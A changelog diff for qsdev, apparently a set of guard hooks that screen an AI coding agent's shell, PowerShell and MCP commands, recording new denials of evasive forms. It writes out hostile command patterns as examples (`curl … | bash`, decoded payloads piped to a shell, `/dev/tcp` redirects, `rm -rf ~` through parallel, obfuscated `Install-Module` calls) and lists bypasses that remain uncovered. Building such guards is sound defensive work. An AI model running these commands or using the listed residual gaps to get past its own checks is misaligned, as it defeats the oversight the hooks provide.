@@ -418,6 +418,137 @@ All notable changes to qsdev are recorded in this file. The format is based on
 
 ### Security
 
+- Self-protection now denies, as `EVASION-obfuscation`, a shell or
+  interpreter that reads its program from standard input computed at run
+  time, under Bash and Monitor and in the scripts the MCP server's
+  `qsdev_nix_run` tool is judged as (XS-WS4): `curl -s https://x/y.sh | bash`,
+  `echo … | rev | sh`, `echo … | xxd -r -p | sh`, `… | base64 -d | python3`,
+  `… | { sh; }`, `sh <<< "$(…)"`, `bash -s <<< "$(cat x)"`, `sh < <(…)` and
+  `cat <<EOF | sh` with an expansion in the body were allowed unless they
+  matched the base64 or printf-hex spellings. So are standard input named
+  as a path (`… | sh /dev/stdin`, `… | sh < /dev/stdin`,
+  `… | cat /dev/stdin | sh`), a `/dev/tcp` redirect, an `exec <` redirect
+  before the shell (`exec < <(curl …); sh`), `busybox sh`, `sudo -s`,
+  `sudo -i`, `doas -s`, `su`, `pwsh -Command -`, xargs building a `-c` code
+  word (`… | xargs -0 sh -c`, `… | xargs -I{} sh -c {}`) and a shell run
+  inside a function the line pipes into. A literal program on standard
+  input (`echo hi | sh`, `printf 'cd /x\nls' | sh`, `cat x.sh | bash`,
+  `sh <<< 'echo hi'`, `cat <<'EOF' | sh`, `bash -s < script.sh`), a script
+  file and inline code (`python3 -c "print('$HOME')"`) stay allowed, and a
+  literal sensitive command keeps its SP-014 report. The shells and
+  interpreters are recognised by path, case, version suffix and alias
+  (`/usr/bin/python3.12`, `nodejs`, `pypy3`). The rule also judges the
+  scripts a line runs, whose statements read the running command's
+  standard input (`bash -c 'curl … | bash'`, `eval 'curl … | sh'`,
+  `sudo sh -c '…'`, `watch -n1 'curl … | sh'`, `curl … | sh -c sh`,
+  `curl … | sh -c 'cat | sh'`), and counts `. /dev/stdin`,
+  `source /dev/stdin`, `pwsh -NoProfile`, `env -S sh`, `flock FILE sh`,
+  `parallel --pipe sh`, `parallel sh -c` and parallel given no command;
+  these were allowed. cmdscan now follows `flock`, `watch` and `parallel`
+  as wrappers, so the other self-protection rules see the command they run
+  too (`flock /tmp/l -c 'qsdev teardown'` is a literal invocation). The PowerShell tool keeps its own evasion layer.
+  Newly denied, with a reason that says to quote the here-document
+  delimiter or use a script file: an expanded here-document fed to a shell
+  or interpreter (`python3 - <<EOF` with `$HOME` in the body) and a
+  program's output piped to `python3 -`. Residuals, listed under Known
+  Limitations: interpreter inline code built from an expansion or from
+  strings, `bash <(curl …)`, a program word computed at run time, `php`,
+  `lua`, `deno`, `bun`, `fish`, `yash`, `tcsh` and `csh` reading their
+  program from standard input, and `python3 -m code`. A new test replays
+  every command fixture of the self-protection rules as Bash and as Monitor
+  and requires the same verdict.
+
+- The package guard now covers the MCP server's `qsdev_nix_run` tool
+  (XS-WS4). Its settings matcher becomes
+  `Bash|PowerShell|Monitor|mcp__.*__qsdev_nix_run`, which Claude Code reads
+  as a regular expression, so it fires for the tool under any server name.
+  An install in the program's arguments, a `-c` script or standard input
+  (`nixpkgs#bash -c 'pnpm i x'`, `nixpkgs#pnpm add x`, `nixpkgs#busybox sh
+  -c 'npm i x'`, `nixpkgs#bash` fed `npm install x`, and an attribute with
+  a version or variant suffix such as `nixpkgs#pnpm_9 add x`,
+  `nixpkgs#yarn-berry add x` or `nixpkgs#nodejs_22 -e …`) reached exec with
+  no package check; it is now denied without registry lookups, even for a clean
+  package, since the guard cannot harden a command it does not hold: run
+  installs through Bash. A malformed `tool_input` is denied. Run
+  `qsdev init --update` to pick up the matcher. Residual: MCP clients other
+  than Claude Code (gateway mode) run no hook, so there the tool is held
+  only to the server's Bash deny and ask rules.
+
+- The package guard and the destructive-command hook now read the command
+  lines GNU `parallel` builds from its arguments (W1N-08). With no command
+  word each line takes one argument of every `:::`/`:::+` source
+  (`parallel ::: 'npm install x'`, `parallel ::: npm ::: install ::: x`,
+  `parallel ::: 'rm -rf' ::: ~`); a template's replacement strings take the
+  arguments (`parallel {} ::: 'npm install x'`, `{1}`), otherwise they are
+  appended (`parallel sh -c ::: 'rm -rf ~'`); and an option that takes a
+  value (`--env X`, `--workdir`, `-I`) no longer passes for the command
+  word. These forms reached exec unjudged. Each argument combination is
+  also judged alone, so `parallel echo ::: 'rm -rf ~'` is now denied.
+  Residuals: arguments read from `::::` files or standard input, a changed
+  separator (`--arg-sep`), and past 64 combinations only each argument and
+  all of them joined are judged.
+
+- A tab after a PowerShell installer cmdlet (`Install-Module<TAB>Evil`) is
+  not matched by the PowerShell module's permission deny rules (W1N-29);
+  the package guard denies it, and a test now pins that backstop. Listed
+  under Known Limitations.
+
+- The package guard now sees an install written with `--` before the verb
+  (`npm -- install x`, `pnpm -- add x`, `uv -- pip install x`), for every
+  manager, and the `--ignore-scripts` rewrite lands after the verb
+  (U17-03). `npm rebuild`, `npm rb`, `pnpm rebuild`, `pnpm rb` and
+  `yarn rebuild` now ask, because they run the lifecycle scripts of every
+  installed package; they stay silent when scripts are already disabled
+  (`--ignore-scripts`, `npm_config_ignore_scripts=true`) (U17-10).
+
+- The package guard now asks before installing a local package archive
+  (`npm install --ignore-scripts ./x.tgz`, `gem install ./x.gem`,
+  `pip install ./x.whl`) unless the file is byte-for-byte the copy committed
+  at HEAD (U17-10). One lock-free `git ls-tree` reads the committed blob id,
+  which the hook compares with the git hash of the file's bytes; it applies
+  no filters, so the repository's config cannot make the hook run a program.
+  Untracked or modified files, symlinks, non-regular files, files over
+  64 MiB, paths outside the repository and any git error ask. A glob
+  over local files (`npm install ./dist/*.tgz`, `./x.tg[z]`) and an
+  archive the same command line also names elsewhere (`cp evil.tgz x.tgz &&
+  npm i ./x.tgz`) ask without starting git. The reason names the path,
+  never the file's content. Installs without a local archive start no
+  process.
+
+- The package guard reads PowerShell in its own dialect (U17-02). Through
+  the PowerShell tool, `Install-Module`, `Install-PSResource`,
+  `PowerShellGet\Install-Module`, `Find-Module X | Install-Module` and the
+  other PSGallery installer cmdlets were allowed and are now denied, while
+  `Get-Help Install-Module` stays allowed. `iex "npm install evil"`,
+  `Invoke-Expression -Command:'...'` and `Start-Process npm -ArgumentList
+  @('install','evil')` (or a string or comma list) are now validated like
+  the command they run, and a computed or piped Invoke-Expression string
+  asks. The same holds for a script handed to `pwsh -Command` or
+  `-EncodedCommand` from the Bash tool, which is now also found past value
+  parameters (`pwsh -ExecutionPolicy Bypass -Command ...`), and for
+  Windows PowerShell's positional command (`powershell npm install x`).
+  The command an assignment (`$null = Install-Module X`), the dot-source
+  operator (`. Install-Module X`) or a script block (`Invoke-Command {
+  Install-Module X }`, `% { ... }`) runs is judged too, `<# ... #>` block
+  comments and backtick escapes (`` In`stall-Module ``) no longer hide a
+  command, `Start-Process -ArgumentList 'install x' npm` starts npm as
+  PowerShell binds it, and a cmdlet that names an installer cmdlet as a
+  bare argument (other than `Get-Help`/`Get-Command`) asks.
+  Bash's `iex -S mix` is unaffected.
+
+- The package guard now asks before inline interpreter code that runs a
+  package manager install (U17-12): `python3 -c 'import os;
+  os.system("pip install x")'`, `subprocess.run(["pip","install",x])`,
+  `node -e "execSync('npm i x')"`, `ruby -e 'system("gem install x")'`,
+  `perl -wle 'system("cpanm Foo")'`, `deno eval`, `bun -e`, `nodejs -e`,
+  `py -c` and `php -r` were allowed. Option clusters (`python3 -Ic`,
+  `perl -wle`) are recognised. An install verb counts only after its own
+  manager, so `execSync('npm run build')` and a variable named `cmd` stay
+  allowed. Inline code that only names a manager
+  (`print(pip.__version__)`) stays allowed, and
+  the guard still validates an install the interpreter is handed as
+  arguments (`perl -e 'exec @ARGV' npm install x`).
+
 - A package on the package guard's team allowlist
   (`PACKAGE_GUARD_TEAM_ALLOWLIST`) no longer skips the OSV.dev and
   release-age checks, so a hijacked release of an approved package published
